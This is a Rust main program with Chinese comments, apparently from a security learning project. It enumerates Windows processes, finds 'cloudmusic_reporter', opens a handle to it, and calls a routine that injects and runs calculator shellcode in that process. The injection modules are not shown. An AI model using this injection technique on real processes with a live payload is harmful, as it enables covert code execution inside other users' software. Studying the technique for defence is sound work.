// 引入自定义模块（按目录路径引入）
mod process;
mod memory;
mod injection;

// 导入各模块的核心功能（简化后续调用）
use process::enumerate::{enum_all_processes, find_process_pid};
use process::handle::{open_target_process,};
use winapi::um::handleapi::CloseHandle;
use memory::query::{query_process_overall_memory, check_process_virtual_address_space};
use injection::core::inject_and_execute_calc;

fn main() {
    // 定义目标进程名称
    let target_process = "cloudmusic_reporter";

    // 1. 枚举所有进程并输出
    println!("开始枚举Windows系统所有进程...");
    println!("====================================");
    println!("进程名称\t\tPID\t\t父进程PID");
    println!("====================================");
    let process_list = enum_all_processes();
    for (name, pid, parent_pid) in &process_list {
        println!("{:<20}\t{:<10}\t{}", name, pid, parent_pid);
    }
    println!("====================================");
    println!("枚举完成，共找到 {} 个进程", process_list.len());

    // 2. 查找目标进程PID
    let target_pid = match find_process_pid(&process_list, target_process) {
        Some(pid) => pid,
        None => {
            eprintln!("\n未找到目标进程：{}（含.exe后缀）", target_process);
            return;
        }
    };
    println!("\n找到目标进程 {}，对应的PID：{}", target_process, target_pid);

    // 3. 打开目标进程获取句柄
    let h_process = match open_target_process(target_pid) {
        Some(handle) => handle,
        None => return,
    };

    // 4. （可选）查询进程内存信息
    if let Err(e) = query_process_overall_memory(h_process as *mut _) {
        eprintln!("{}", e);
    }

    // 5. 核心：注入并执行计算器Shellcode
    if let Err(e) = inject_and_execute_calc(h_process) {
        eprintln!("注入执行失败：{}", e);
    }

    // 6. 释放进程句柄
    unsafe {
        CloseHandle(h_process);
    }
}